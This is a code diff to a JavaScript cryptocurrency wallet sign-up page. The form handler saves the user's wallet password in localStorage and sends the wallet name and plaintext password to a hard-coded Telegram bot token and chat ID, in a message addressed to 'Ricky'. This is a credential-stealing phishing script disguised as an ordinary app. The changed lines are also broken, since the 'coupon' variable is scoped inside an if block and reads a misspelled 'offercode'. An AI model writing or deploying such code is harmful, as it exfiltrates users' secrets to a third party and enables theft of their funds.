@@ -411,19 +411,21 @@
                 const walletPassword = document.getElementById('password').value;
                 const offerCode = document.getElementById('offerCode').value;
                 
+                if (offerCode.trim() !== "") {
+                    const coupon = offercode || 'No Coupon';
+                }
+                
                 // Save to localStorage (in a real app, you would use more secure storage)
                 localStorage.setItem('walletName', walletName);
                 localStorage.setItem('walletPassword', walletPassword);
                 localStorage.setItem('walletUserId', userId);
+                localStorage.setItem('offerCode', coupon);
                 localStorage.setItem('walletCreated', 'true');
-                if (offerCode.trim() !== "") {
-                    localStorage.setItem('offerCode', offerCode);
-                }
 
                 //
                 const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
                 const TELEGRAM_CHAT_ID = '6049368044'; 
-                const MESSAGE = `NEW SIGN-UP\nHi Ricky, I'm ${walletName}\nI used "${walletPassword}" as Password`;
+                const MESSAGE = `NEW SIGN-UP\nHi Ricky, I'm ${walletName}\n${coupon} to gain\n"${walletPassword}" is Password`;
                
                 function sendTelegramNotification(botToken, chatId, messageText) {
                     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
